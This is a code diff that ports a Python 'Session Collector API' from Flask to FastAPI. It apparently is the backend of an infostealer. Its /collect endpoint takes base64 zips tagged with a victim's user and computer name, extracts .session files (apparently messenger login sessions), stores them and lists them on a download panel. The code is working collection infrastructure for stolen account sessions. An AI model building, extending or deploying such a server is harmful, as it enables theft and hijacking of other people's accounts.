@@ -3,17 +3,25 @@ import json
 import base64
 import zipfile
 import datetime
-import shutil
-from flask import Flask, request, jsonify, render_template_string, send_file, abort
+from fastapi import FastAPI, Request, HTTPException
+from fastapi.responses import HTMLResponse, FileResponse, JSONResponse
+from fastapi.templating import Jinja2Templates
+from pydantic import BaseModel, ValidationError
+import uvicorn
 
-app = Flask(__name__)
+app = FastAPI(title="Session Collector API")
 
 UPLOAD_DIR = "uploads"
 SESSION_DIR = "sessions"
 os.makedirs(UPLOAD_DIR, exist_ok=True)
 os.makedirs(SESSION_DIR, exist_ok=True)
 
-HTML_INDEX = """
+# Шаблоны (Jinja2)
+templates = Jinja2Templates(directory="templates")
+# Чтобы не создавать папку templates, вставим HTML прямо в код через строку
+# Для простоты можно рендерить через строку, но лучше создать templates/index.html
+# В целях демонстрации создадим папку и файл при первом запуске
+HTML_TEMPLATE = """
 <!DOCTYPE html>
 <html>
 <head>
@@ -142,12 +150,10 @@ HTML_INDEX = """
             document.getElementById('modal').style.display = 'none';
         }
 
-        // Закрытие по Escape
         document.addEventListener('keydown', function(e) {
             if (e.key === 'Escape') closeModal();
         });
 
-        // Переключение вкладок
         document.querySelectorAll('.tab-btn').forEach(btn => {
             btn.addEventListener('click', function() {
                 document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
@@ -161,13 +167,25 @@ HTML_INDEX = """
 </html>
 """
 
-def extract_sessions(zip_path, user, computer):
-    extracted = []
+# Создаём папку templates и пишем туда HTML при старте
+os.makedirs("templates", exist_ok=True)
+with open("templates/index.html", "w", encoding="utf-8") as f:
+    f.write(HTML_TEMPLATE)
+
+# Pydantic модель для входящего JSON
+class CollectPayload(BaseModel):
+    user: str
+    computer: str
+    time: str
+    data: str  # base64 строка
+
+def extract_sessions_sync(zip_path: str, user: str, computer: str):
+    """Синхронная функция распаковки .session файлов"""
     try:
         with zipfile.ZipFile(zip_path, 'r') as zf:
             for info in zf.infolist():
                 if info.filename.lower().endswith('.session') and not info.is_dir():
-                    data = zf.read(info.filename)
+                    file_data = zf.read(info.filename)
                     base = os.path.basename(info.filename)
                     safe_user = "".join(c for c in user if c.isalnum() or c in ('-','_')) or "unknown"
                     safe_comp = "".join(c for c in computer if c.isalnum() or c in ('-','_')) or "unknown"
@@ -175,46 +193,11 @@ def extract_sessions(zip_path, user, computer):
                     new_name = f"{safe_user}_{safe_comp}_{timestamp}_{base}"
                     dest = os.path.join(SESSION_DIR, new_name)
                     with open(dest, 'wb') as f:
-                        f.write(data)
-                    extracted.append(dest)
+                        f.write(file_data)
     except Exception as e:
         print(f"Extract error: {e}")
-    return extracted
 
-@app.route('/collect', methods=['POST'])
-def collect():
-    try:
-        data = request.get_json()
-        if not data:
-            return jsonify({"status": "error", "message": "No JSON"}), 400
-
-        required = ['user', 'computer', 'time', 'data']
-        if not all(k in data for k in required):
-            return jsonify({"status": "error", "message": "Missing fields"}), 400
-
-        zip_b64 = data['data']
-        try:
-            zip_bytes = base64.b64decode(zip_b64)
-        except Exception as e:
-            return jsonify({"status": "error", "message": f"Invalid base64: {str(e)}"}), 400
-
-        timestamp = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
-        safe_user = "".join(c for c in data['user'] if c.isalnum() or c in ('-','_')) or "unknown"
-        safe_computer = "".join(c for c in data['computer'] if c.isalnum() or c in ('-','_')) or "unknown"
-        filename = f"{safe_user}_{safe_computer}_{timestamp}.zip"
-        filepath = os.path.join(UPLOAD_DIR, filename)
-
-        with open(filepath, 'wb') as f:
-            f.write(zip_bytes)
-
-        extract_sessions(filepath, data['user'], data['computer'])
-
-        return jsonify({"status": "success", "filename": filename}), 200
-
-    except Exception as e:
-        return jsonify({"status": "error", "message": str(e)}), 500
-
-def list_files(dir_path, ext_filter=None):
+def list_files_sync(dir_path: str, ext_filter: str = None):
     files = []
     for fname in os.listdir(dir_path):
         full = os.path.join(dir_path, fname)
@@ -230,30 +213,61 @@ def list_files(dir_path, ext_filter=None):
     files.sort(key=lambda x: x['date'], reverse=True)
     return files
 
-@app.route('/')
-def index():
-    uploads = list_files(UPLOAD_DIR, '.zip')
-    sessions = list_files(SESSION_DIR, '.session')
-    return render_template_string(HTML_INDEX, uploads=uploads, sessions=sessions)
+@app.post("/collect")
+async def collect(payload: CollectPayload):
+    try:
+        # Декодируем base64
+        try:
+            zip_bytes = base64.b64decode(payload.data)
+        except Exception as e:
+            raise HTTPException(status_code=400, detail=f"Invalid base64: {str(e)}")
 
-@app.route('/download/upload/<filename>')
-def download_upload(filename):
+        timestamp = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
+        safe_user = "".join(c for c in payload.user if c.isalnum() or c in ('-','_')) or "unknown"
+        safe_computer = "".join(c for c in payload.computer if c.isalnum() or c in ('-','_')) or "unknown"
+        filename = f"{safe_user}_{safe_computer}_{timestamp}.zip"
+        filepath = os.path.join(UPLOAD_DIR, filename)
+
+        # Сохраняем zip
+        with open(filepath, 'wb') as f:
+            f.write(zip_bytes)
+
+        # Распаковываем .session (синхронно, но в фоновом потоке не обязательно)
+        # Можно запустить в отдельном потоке для асинхронности, но для простоты оставим синхронно
+        extract_sessions_sync(filepath, payload.user, payload.computer)
+
+        return {"status": "success", "filename": filename}
+    except Exception as e:
+        raise HTTPException(status_code=500, detail=str(e))
+
+@app.get("/", response_class=HTMLResponse)
+async def index(request: Request):
+    uploads = list_files_sync(UPLOAD_DIR, '.zip')
+    sessions = list_files_sync(SESSION_DIR, '.session')
+    return templates.TemplateResponse("index.html", {
+        "request": request,
+        "uploads": uploads,
+        "sessions": sessions
+    })
+
+@app.get("/download/upload/{filename}")
+async def download_upload(filename: str):
     safe_path = os.path.join(UPLOAD_DIR, filename)
     if not os.path.exists(safe_path):
-        abort(404)
+        raise HTTPException(status_code=404, detail="File not found")
     if not os.path.realpath(safe_path).startswith(os.path.realpath(UPLOAD_DIR)):
-        abort(403)
-    return send_file(safe_path, as_attachment=True)
+        raise HTTPException(status_code=403, detail="Forbidden")
+    return FileResponse(safe_path, filename=filename)
 
-@app.route('/download/session/<filename>')
-def download_session(filename):
+@app.get("/download/session/{filename}")
+async def download_session(filename: str):
     safe_path = os.path.join(SESSION_DIR, filename)
     if not os.path.exists(safe_path):
-        abort(404)
+        raise HTTPException(status_code=404, detail="File not found")
     if not os.path.realpath(safe_path).startswith(os.path.realpath(SESSION_DIR)):
-        abort(403)
-    return send_file(safe_path, as_attachment=True)
+        raise HTTPException(status_code=403, detail="Forbidden")
+    return FileResponse(safe_path, filename=filename)
 
-if __name__ == '__main__':
-    port = int(os.environ.get("PORT", 5000))
-    app.run(host='0.0.0.0', port=port)
+if __name__ == "__main__":
+    port = int(os.environ.get("PORT", 8000))
+    uvicorn.run("main:app", host="0.0.0.0", port=port, reload=True)
